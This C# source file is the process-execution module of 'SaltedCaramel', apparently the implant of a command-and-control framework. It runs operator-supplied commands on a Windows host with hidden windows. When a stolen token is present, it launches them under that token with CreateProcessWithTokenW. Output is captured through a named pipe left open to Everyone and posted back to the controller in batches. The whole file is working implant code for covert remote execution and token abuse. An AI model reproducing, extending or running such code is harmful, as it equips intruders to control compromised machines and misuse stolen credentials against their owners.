using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;

namespace SaltedCaramel
{
    internal class Proc
    {
        // If we have a stolen token, we need to start a process with CreateProcessWithTokenW
        // Otherwise, we can use Process.Start
        internal static void Execute(SCTask task, SCImplant implant)
        {
            if (implant.hasAlternateToken() == true)
                StartProcessWithToken(task, implant, Token.stolenHandle);
            else
               StartProcess(task, implant);
        }

        /// <summary>
        /// Start a process using a stolen token
        /// C#'s System.Diagnostics.Process doesn't respect a WindowsImpersonationContext so we have to use CreateProcessWithTokenW
        /// </summary>
        /// <param name="task"></param>
        /// <param name="implant"></param>
        /// <param name="TokenHandle"></param>
        internal static void StartProcessWithToken(SCTask task, SCImplant implant, IntPtr TokenHandle)
        {
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            string file = split[0];
            // Create PROCESS_INFORMATION struct to hold info about the process we're going to start
            Win32.PROCESS_INFORMATION newProc = new Win32.PROCESS_INFORMATION();
            // STARTUPINFO is used to control a few startup options for our new process
            Win32.STARTUPINFO startupInfo = new Win32.STARTUPINFO();
            // Use C:\Temp as directory to ensure that we have rights to start our new process
            // TODO: determine if this is safe to change
            string directory = "C:\\Temp";

            // Use random name for our named pipe (used to retrieve output from process)
            byte[] random = new byte[2];
            Random rnd = new Random();
            rnd.NextBytes(random);
            string pipeName = "Caramel_" + BitConverter.ToString(random);

            // Set ACL on named pipe to allow any user to access
            PipeSecurity sec = new PipeSecurity();
            sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));

            // Create named pipe server and client
            // We need to use nanmed pipes to communicate with processes started using the Win32 API
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message, PipeOptions.None, 4096, 4096, sec);
            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.Out, PipeOptions.None);

            // TODO: Use anonymous pipes instead of named pipes
            // AnonymousPipeServerStream anon = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.None, 1024, sec);
            // AnonymousPipeClientStream anonClient = new AnonymousPipeClientStream(anon.GetClientHandleAsString());

            try
            {
                pipeClient.Connect();
                pipeServer.WaitForConnection();

                if (pipeClient.IsConnected)
                {
                    // TODO: Use anonymous pipes intead of named pipes
                    // Set process to use named pipe for input/output
                    startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
                    startupInfo.hStdError = pipeClient.SafePipeHandle.DangerousGetHandle();
                    // STARTF_USESTDHANDLES ensures that the process will respect hStdInput/hStdOutput
                    // STARTF_USESHOWWINDOW ensures that the process will respect wShowWindow
                    startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES | (uint)Win32.STARTF.STARTF_USESHOWWINDOW;
                    startupInfo.wShowWindow = 0;
                }
                else
                {
                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");
                    throw new Exception("Error connecting to named pipe server.");
                }

                // We're using lpCommandLine to start our new process because I had issues using both lpApplicationName and lpCommandLine
                string cmdLine;
                string tokenized = "";
                if (argString != "")
                {
                    foreach (string arg in argString.Split(' '))
                    {
                        tokenized += "\"" + arg + "\" ";
                    }
                    cmdLine = "\"" + file + "\" " + tokenized;
                }
                else
                    cmdLine = "\"" + file + "\"";
                // Finally, create our new process
                bool createProcess = Win32.CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, null, cmdLine, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
                Thread.Sleep(100); // Something weird is happening if the process exits before we can capture output
                if (createProcess) // Process started successfully
                {
                    Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
                    SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
                    implant.PostResponse(procStatus);
                    // Trying to continuously read output while the process is running.
                    using (StreamReader reader = new StreamReader(pipeServer))
                    {
                        SCTaskResp response;
                        string message = null;
                        List<string> output = new List<string>();

                        try
                        {
                            Process proc = Process.GetProcessById(newProc.dwProcessId); // We can use Process.HasExited() with this object

                            while (!proc.HasExited)
                            {
                                // Will sometimes hang on ReadLine() for some reason, not sure why
                                // Workaround for this is to time out if we don't get a result in ten seconds
                                Action action = () =>
                                {
                                    try
                                    {
                                        message = reader.ReadLine();
                                    }
                                    catch (Exception e)
                                    {
                                        // Fail silently if reader no longer exists
                                        // May happen if long running job times out?
                                    }
                                };
                                IAsyncResult result = action.BeginInvoke(null, null);
                                if (result.AsyncWaitHandle.WaitOne(300000))
                                {
                                    if (message != null)
                                    {
                                        output.Add(message);
                                        if (output.Count >= 5) // Wait until we have five lines to send
                                        {
                                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
                                            implant.PostResponse(response);
                                            output.Clear();
                                            Thread.Sleep(implant.sleep);
                                        }
                                    }
                                }
                                else
                                {
                                    throw new Exception("Timed out while reading named pipe.");
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            // Sometimes process may exit before we get this object back
                            if (e.Message == "Timed out while reading named pipe.") // We don't care about other exceptions
                            {
                                throw e;
                            }
                        }

                        Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Process with PID " + newProc.dwProcessId + " has exited");

                        pipeClient.Close();
                        pipeClient.Dispose();

                        while (reader.Peek() > 0) // Check if there is still  data in the pipe
                        {
                            message = reader.ReadToEnd(); // Ensure we get any output that we missed when loop ended
                            foreach (string msg in message.Split(new[] { Environment.NewLine }, StringSplitOptions.None))
                            {
                                output.Add(msg);
                            }
                        }
                        if (output.Count > 0)
                        {
                            response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
                            implant.PostResponse(response);
                            output.Clear();
                        }
                    }

                    pipeServer.Close();
                    pipeServer.Dispose();
                    implant.SendComplete(task.id);
                }
                else
                {
                    string errorMessage = Marshal.GetLastWin32Error().ToString();
                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
                    pipeClient.Close();
                    pipeServer.Close();
                    pipeClient.Dispose();
                    pipeServer.Dispose();
                    implant.SendError(task.id, "Error starting process: " + errorMessage);
                }
            }
            catch (Exception e)
            {
                pipeClient.Close();
                pipeServer.Close();
                pipeClient.Dispose();
                pipeServer.Dispose();
                implant.SendError(task.id, "Error: " + e.Message);
            }
        }

        /// <summary>
        /// Start a process using System.Diagnostics.Process
        /// If we don't have to worry about a stolen token we can just start a process normally
        /// </summary>
        /// <param name="task"></param>
        /// <param name="implant"></param>
        internal static void StartProcess (SCTask task, SCImplant implant)
        {
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = split[0];
            startInfo.Arguments = argString;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true; // Ensure we get standard output
            startInfo.CreateNoWindow = true; // Don't create a new window

            Process proc = new Process();
            proc.StartInfo = startInfo;

            try
            {
                Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
                proc.Start();

                List<string> procOutput = new List<string>();
                SCTaskResp response;

                while (!proc.StandardOutput.EndOfStream)
                {
                    string line = proc.StandardOutput.ReadLine();
                    procOutput.Add(line);
                    if (procOutput.Count >= 5)
                    {
                        response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
                        implant.PostResponse(response);
                        procOutput.Clear();
                    }
                }

                proc.WaitForExit();
                response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
                implant.PostResponse(response);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
